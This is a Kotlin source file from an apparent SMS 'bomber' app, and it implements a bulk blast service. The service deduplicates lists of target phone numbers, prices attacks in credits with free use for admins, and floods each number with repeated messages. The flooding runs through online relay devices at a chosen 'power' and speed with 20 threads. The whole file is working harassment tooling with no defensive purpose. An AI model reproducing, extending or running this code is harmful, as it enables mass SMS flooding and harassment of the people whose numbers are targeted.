package com.sanji.bomberpro.services

import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext

data class BulkBlastConfig(
    val perNumberCount: Int,
    val power: Int,
    val speed: BlastSpeed,
)

data class BulkCostEstimate(
    val numbersCount: Int,
    val perNumberCount: Int,
    val power: Int,
    val totalSms: Int,
    val totalCredits: Int,
    val affordable: Boolean,
    val maxAffordable: Int,
)

class BulkBlastService {

    private val db = FirebaseFirestore.getInstance()
    private val userData = UserDataService()
    private val rtdb = RealtimeDbService()

    /**
     * Premium check via user doc.
     */
    suspend fun isUserPremium(uid: String): Boolean = withContext(Dispatchers.IO) {
        try {
            val snap = db.collection(FirebaseConfig.COL_USERS).document(uid).get().await()
            snap.getBoolean("premium") ?: false
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Validate user's number list — strips empty, dedupes, ensures min length.
     */
    fun cleanNumbers(raw: List<String>): List<String> {
        val clean = raw.map { it.trim() }
            .map { it.replace(" ", "").replace("-", "") }
            .filter { it.length >= 7 }
            .filter { it.all { ch -> ch.isDigit() || ch == '+' } }
            .distinct()
        return clean
    }

    /**
     * Cost estimate before blast.
     * Bulk uses `settings.creditCostPerSms` OR `bulkCreditCostPerNumber` — the higher of the two.
     * (Per-number cost is a floor to prevent cheap spam.)
     */
    suspend fun estimate(
        numbersCount: Int,
        perNumberCount: Int,
        power: Int,
        uid: String,
        isAdmin: Boolean,
    ): BulkCostEstimate = withContext(Dispatchers.IO) {
        val settings = userData.getGlobalSettings()
        val costPerSms = settings.creditCostPerSms.coerceAtLeast(1)
        val costPerNumber = settings.bulkCreditCostPerNumber.coerceAtLeast(1)

        val totalSms = numbersCount * perNumberCount * power
        val bySms = totalSms * costPerSms
        val byNumber = numbersCount * costPerNumber
        val totalCredits = maxOf(bySms, byNumber)

        if (isAdmin) {
            return@withContext BulkCostEstimate(
                numbersCount = numbersCount,
                perNumberCount = perNumberCount,
                power = power,
                totalSms = totalSms,
                totalCredits = 0,
                affordable = true,
                maxAffordable = Int.MAX_VALUE,
            )
        }

        val available = userData.getCredits(uid)
        val affordable = available >= totalCredits
        val maxBySms = if (costPerSms > 0) available / costPerSms else 0
        val maxByNumber = if (costPerNumber > 0) available / costPerNumber else 0
        val maxAffordable = minOf(
            if (power > 0) maxBySms / (perNumberCount * power) else 0,
            maxByNumber,
        )

        BulkCostEstimate(
            numbersCount = numbersCount,
            perNumberCount = perNumberCount,
            power = power,
            totalSms = totalSms,
            totalCredits = totalCredits,
            affordable = affordable,
            maxAffordable = maxAffordable,
        )
    }

    /**
     * Execute bulk blast — iterates over each number, calls blast() for each.
     * Refunds auto-handled inside BlastExecutor.
     *
     * Returns total sent, failed across all numbers.
     */
    suspend fun executeBulk(
        uid: String,
        isAdmin: Boolean,
        userName: String,
        userEmail: String,
        numbers: List<String>,
        message: String,
        config: BulkBlastConfig,
        onProgress: (index: Int, total: Int, sent: Int, failed: Int) -> Unit,
        cancelFlag: java.util.concurrent.atomic.AtomicBoolean,
    ): BulkBlastSummary = withContext(Dispatchers.IO) {
        val executor = BlastExecutor(rtdb)

        var totalSent = 0
        var totalFailed = 0
        val startTs = System.currentTimeMillis()

        try {
            val firebases = rtdb.loadFirebases()
            val devices = rtdb.scanAll(firebases)

            if (devices.isEmpty()) {
                return@withContext BulkBlastSummary(
                    numbersAttempted = 0,
                    numbersCompleted = 0,
                    totalSent = 0,
                    totalFailed = 0,
                    durationSec = 0,
                    cancelled = false,
                    error = "No devices online",
                )
            }

            numbers.forEachIndexed { i, target ->
                if (cancelFlag.get()) return@forEachIndexed
                try {
                    var perNumberSent = 0
                    var perNumberFailed = 0

                    executor.execute(
                        uid = uid,
                        isAdmin = isAdmin,
                        userData = userData,
                        userName = userName,
                        userEmail = userEmail,
                        devices = devices,
                        target = target,
                        message = message,
                        count = config.perNumberCount,
                        power = config.power,
                        threads = 20,
                        speed = config.speed,
                        cancelFlag = cancelFlag,
                    ).collect { event ->
                        when (event) {
                            is BlastEvent.Progress -> {
                                perNumberSent = event.sent
                                perNumberFailed = event.failed
                            }
                            is BlastEvent.Complete -> {
                                perNumberSent = event.sent
                                perNumberFailed = event.failed
                            }
                            else -> Unit
                        }
                        onProgress(i, numbers.size, totalSent + perNumberSent, totalFailed + perNumberFailed)
                    }

                    totalSent += perNumberSent
                    totalFailed += perNumberFailed
                } catch (_: Exception) {
                    totalFailed += config.perNumberCount * config.power
                }
            }

            try {
                userData.saveBulkBlastHistory(
                    uid = uid,
                    numbers = numbers,
                    message = message,
                    perNumberCount = config.perNumberCount,
                    power = config.power,
                    totalSent = totalSent,
                    totalFailed = totalFailed,
                    durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                    speed = config.speed.label,
                    status = if (cancelFlag.get()) "stopped" else "completed",
                )
            } catch (_: Exception) {}

            BulkBlastSummary(
                numbersAttempted = numbers.size,
                numbersCompleted = numbers.size,
                totalSent = totalSent,
                totalFailed = totalFailed,
                durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                cancelled = cancelFlag.get(),
                error = null,
            )
        } catch (e: Exception) {
            BulkBlastSummary(
                numbersAttempted = numbers.size,
                numbersCompleted = 0,
                totalSent = totalSent,
                totalFailed = totalFailed,
                durationSec = (System.currentTimeMillis() - startTs) / 1000L,
                cancelled = cancelFlag.get(),
                error = e.message ?: "Bulk failed",
            )
        }
    }
}

data class BulkBlastSummary(
    val numbersAttempted: Int,
    val numbersCompleted: Int,
    val totalSent: Int,
    val totalFailed: Int,
    val durationSec: Long,
    val cancelled: Boolean,
    val error: String?,
)